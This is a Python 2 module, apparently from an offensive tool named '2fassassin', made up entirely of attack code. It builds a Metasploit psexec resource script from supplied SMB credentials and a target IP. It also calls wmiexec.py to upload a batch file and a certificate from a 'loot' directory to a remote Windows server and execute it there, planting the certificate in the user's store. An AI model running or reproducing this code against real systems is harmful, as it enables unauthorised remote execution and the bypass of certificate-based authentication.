#!/usr/bin/env python

import os, sys, time
from edit import writer


def generate(username, password, server_ip):
    filename = "/root/2fassassin/cert/transport/instruction/muscle"
    try:
        os.remove(filename)
    except OSError:
        pass

    string = ""
    string += "echo 'use exploit/windows/smb/psexec' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    string += "echo 'set rhost' %s >> /root/2fassassin/cert/transport/instruction/muscle" %server_ip
    string += ";"
    string += "echo 'set SMBUser' %s >> /root/2fassassin/cert/transport/instruction/muscle" %username
    string += ";"
    string += "echo 'set SMBPass' %s >> /root/2fassassin/cert/transport/instruction/muscle" %password
    string += ";"
    string += "echo 'set EXITFUNC seh' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    string += "echo 'set AutoRunScript multi_console_command -rc /root/2fassassin/cert/transport/instruction/missy' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    string += "echo 'run' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    os.system(string)
    sys.exit()



# fuck this shit !!!
def connect(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    # send the client-certifcate to remote windows server
    key = "wmiexec.py " +username
    key += ":" +password
    key += "@" +server_ip
    key += " "
    #key += "put '/root/2fassassin/cert/transportkey.bat'"
    #key += "put"
    #key += " "
    #key += "/root/2fassassin/cert/transport/key.bat && /root/2fassassin/cert/transport/ClientCert.pfx"
    key += "put /root/2fassassin/cert/transport/key.bat"
    key += ";"
    key += "ipconfig"
    #key += "put /root/2fassassin/cert/transport/ClientCert.pfx"
    #key += "ipconfig"
    #key += ";"
    #key += "route"
    #key += " "
    #key += "put"
    #key += " "
    #key += "/root/2fassassin/cert/transport/ClientCert.pfx"
    #key += "C:\key.bat"
    os.system(key)
    #running = "put"
    #running += " "
    #running += "/root/2fassassin/cert/transport/ClientCert.pfx"
    #os.system(running)
        #key += "C:\key.bat"



    #time.sleep(2)
    sys.exit()

def connect1(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    # send the client-certifcate to remote windows server
    key = "wmiexec.py " +username
    key += ":" +password
    key += "@" +server_ip
    key += " "
    key += "put /root/2fassassin/cert/transport/key.bat"
    os.system(key)
    sys.exit()



def connect2(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    # send the client-certifcate to remote windows server
    key = "wmiexec.py " +username
    key += ":" +password
    key += "@" +server_ip
    key += " "
    key += "put /root/2fassassin/loot/ClientCert.pfx"
    os.system(key)
    sys.exit()



def connect3(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    # execute the batch file to add the client certificate to current user personal store
    run = "wmiexec.py " +username
    run += ":" +password
    run += "@" +server_ip
    run += " "
    #run += "cmd"
    #run += ";"
    run += "C:key.bat"
    os.system(run)
    sys.exit()

# connect() doens't work, so don't allow!!
__all__ = ['generate','connect1', 'connect2', 'connect3']
